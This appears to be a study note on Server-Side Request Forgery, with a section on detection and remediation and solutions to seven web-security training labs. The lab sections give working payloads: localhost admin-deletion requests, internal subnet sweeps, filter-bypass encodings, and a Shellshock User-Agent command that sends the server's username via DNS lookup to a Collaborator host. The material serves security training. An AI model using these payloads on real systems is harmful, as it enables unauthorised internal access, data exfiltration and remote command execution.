## 1. Vulnerability Core

- **Vulnerability Type:** Server-Side Request Forgery (SSRF)
    
- **Core Meaning:** SSRF arises when a server-side application accepts a user-supplied URL or hostname parameter and processes an outbound network request to that address without proper validation. This acts as a proxy mechanism, forcing the vulnerable backend server to perform network operations on behalf of the attacker.
    
- **The Downstream Pivot:** Attackers leverage the server's trusted network position to access internal-only loopback interfaces (`127.0.0.1`), query non-routable private backend subnets (`192.168.0.0/16`), harvest cloud infrastructure metadata tokens, or deliver secondary payloads (e.g., Shellshock) to internal systems that are completely unreachable from the public internet.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding SSRF requires auditing parameters that accept web addresses, absolute file paths, or system identifiers used for data synchronization or media fetching.

### Identifying High-Risk Code Features

- **Data Aggregators & Stock Checkers:** Form inputs that verify availability or synchronize catalogs across external branches using direct API URLs.
    
- **File Converters & Web Scrapers:** Modules that render external HTML to PDF, fetch remote avatars, or preview URL bookmarks.
    
- **Analytics Trackers & Webhooks:** Logging utilities that automatically connect to links passed via metadata properties or HTTP transmission wrappers.


### Active Probing Strategy

- **Out-of-Band (OAST) Testing:** Supply a unique, controlled domain identifier (e.g., Burp Collaborator) into candidate parameters or meta headers (such as the `Referer` or `X-Forwarded-For` lines) to detect asynchronous backend connection lookups.
    
- **Parser Discrepancy Testing:** Test how strict filters handle irregular URL syntax architectures. Mix credentials separators (`@`), fragment tags (`#`), and multi-stage hexadecimal or octal IP strings to see if validation modules drop out-of-sync with the backend transmission engine.
    

## 3. Classifications (The Scenarios)

- **In-Band Loopback Interrogation:** Forcing the application to call back into its own local hosting adapter (`localhost`), instantly dropping front-facing access control boundaries.
    
- **Backend Network Scanning:** Iterating through private IP octet blocks via the target's internal network gateway to find active administrative ports.
    
- **Blacklist Bypassing via Obfuscation:** Circumventing basic text drop-lists by mutating blocked text strings using alternative digit representations (like `127.1`) or double-URL encoding tricks (`%2561`).
    
- **Open Redirect Chaining:** Satisfying an asset restriction filter by pointing to a legitimate local route that contains an unvalidated `Location` redirect feature, pivoting the connection to a restricted target.
    
- **Blind OAST Detection:** Spotting silent backend analytics triggers by feeding remote host variables inside metadata headers.
    
- **Blind Shellshock Pivoting:** Injecting shell command execution macros inside headers (e.g., `User-Agent`) during an internal subnet sweep to find vulnerable backend servers.
    
- **Whitelist URL Parsing Discrepancies:** Exploiting standard URL components (such as credentials or fragments) to make a validation module see an approved host string while the connection logic navigates to an entirely different server.
    

## 4. Remediation

- **Implement Strict Whitelisting:** Validate input parameters against a strict list of allowed literal strings or specific IP addresses. Reject generic inputs containing dynamic URL structural elements.
    
- **Enforce Network Egress Isolation:** Configure local firewalls and network routing policies to prevent the web server from initiating direct outbound requests to private subnets or the local host loopback adapter.

## 5. Lab Breakthroughs & Payloads

### Lab 1: Basic SSRF against the local server

- **Attack Vector:** An in-band stock check module takes a full target URL parameter, allowing direct access to the administrative dashboard on the local loopback interface.
    

 ### 🛑 LAB EXPLOIT & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Intercept the standard check stock form submission in Burp Suite.
     
 2. [ ] Replace the external tracking server URL inside the `stockApi` parameter with a pointer targeting the administrative deletion path on the local interface:
     
     HTTP
     
     ```
     POST /product/stock HTTP/1.1
     Host: target.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 59
     
     stockApi=http://localhost/admin/delete?username=carlos
     ```
     

### Lab 2: Basic SSRF against another back-end system

- **Attack Vector:** The stock check component can connect to hidden servers on an internal `192.168.0.X` address layout.
    

 ### 🛑 LAB EXPLOIT & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Intercept the stock request and route it into Burp Intruder.
     
 2. [ ] Parameterize the last octet of the target IP address string inside the data field:
     
     HTTP
     
     ```
     stockApi=http://192.168.0.§1§:8080/admin
     ```
     
 3. [ ] Use a **Numbers** payload type ranging from `1` to `255` (Step `1`). Run the cluster check.
     
 4. [ ]  Analyze the returned status codes. Locate the unique `200 OK` response (e.g., at `192.168.0.22`), forward it to Repeater, and run the target administrative deletion request:
     
     HTTP
     
     ```
     stockApi=http://192.168.0.22:8080/admin/delete?username=carlos
     ```
     

### Lab 3: Blind SSRF with out-of-band detection

- **Attack Vector:** A background analytics service automatically connects to links discovered inside incoming `Referer` headers without returning structural output to the client browser.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):** Send a standard page request to an active product item path, swapping out the default domain address inside the `Referer` line with a unique Burp Collaborator subdomain payload tracker:
 
 HTTP
 
 ```
 GET /product?productId=1 HTTP/1.1
 Host: target.web-security-academy.net
 Referer: http://YOUR-COLLABORATOR-SUBDOMAIN.oastify.com
 User-Agent: Mozilla/5.0
 ```
 
 - **Verification:** Check the Collaborator tracker log panel and click **Poll Now** to verify the asynchronous HTTP request event triggered directly from the application server.
     

### Lab 4: SSRF with blacklist-based input filter

- **Attack Vector:** Validation modules actively block inputs that match standard administrative keywords or strings like `127.0.0.1` and `localhost`.
    

 ### 🛑 LAB EXPLOIT & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Use the condensed alternative loopback notation string `127.1` to bypass the core numeric IP pattern tracker filter.
     
 2. [ ] The string `admin` is also blocked. Bypass this control by double-URL encoding the leading character (`a` becomes `%2561`) to confuse the parsing engine's string matching component:
     
     HTTP
     
     ```
     stockApi=http://127.1/%2561dmin/delete?username=carlos
     ```
     

### Lab 5: SSRF with filter bypass via open redirection vulnerability

- **Attack Vector:** The stock tracker input filter blocks direct connections to external or non-local hosts but permits queries to paths inside its own domain. You can bypass this restriction by routing your connection through an open redirect feature found on a legitimate page.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. Locate the application's native product navigation routing path (`/product/nextProduct`), which redirects browsers via an unvalidated `path` query parameter.
     
 2. Pass this local open redirect URL into the `stockApi` parameter, configuring the destination argument to point directly to the restricted internal admin dashboard:
     
     HTTP
     
     ```
     stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
     ```
     

### Lab 6: Blind SSRF with Shellshock exploitation

- **Attack Vector:** Chaining a blind metadata-driven SSRF vulnerability with an internal environment exploit. The server reads the incoming `Referer` line and connects to an internal network segment, echoing the client's `User-Agent` string into an unpatched system environment vulnerable to Shellshock.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
1. [ ] Intercept a valid product page query and route it into Burp Intruder.
     
2. [ ] Configure the `Referer` header to scan the internal subnet spectrum (`192.168.0.1` through `192.168.0.255`) across port `8080`:
     
     HTTP
     
     ```
     Referer: http://192.168.0.§1§:8080
     ```
     
 - [ ] 3.  Replace the `User-Agent` string with a functional Shellshock exploit command macro designed to trigger an out-of-band lookup containing the target environment's username string:
     
     HTTP
     
     ```
     User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN.oastify.com
     ```
     
 4. [ ] Execute the Intruder sweep. Poll your Collaborator dashboard to capture the incoming DNS lookup request. The prefix of the sub-domain query reveals the extracted operating system user account name.
     

### Lab 7: SSRF with whitelist-based input filter

- **Attack Vector:** The application checks incoming URLs against a strict domain whitelist (`stock.weliketoshop.net`). Bypassing this requires exploiting discrepancies between how the validation module and the HTTP request engine parse complex URLs.
    

### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Use the standard credentials symbol (`@`) to embed the required domain string as a username credential prefix: `http://localhost@stock.weliketoshop.net/`.
     
 2. [ ] To force the application server to disregard the trailing whitelist segment entirely, append a URL fragment marker (`#`). The validation filter reads it as part of the domain string, while the backend connection engine treats everything after it as a comment fragment.
     
 3. [ ] Double-URL encode the fragment symbol (`#` turns into `%2523`) to prevent premature browser parsing and force the backend server to process it directly:
     
     HTTP
     
     ```
     stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
     ```
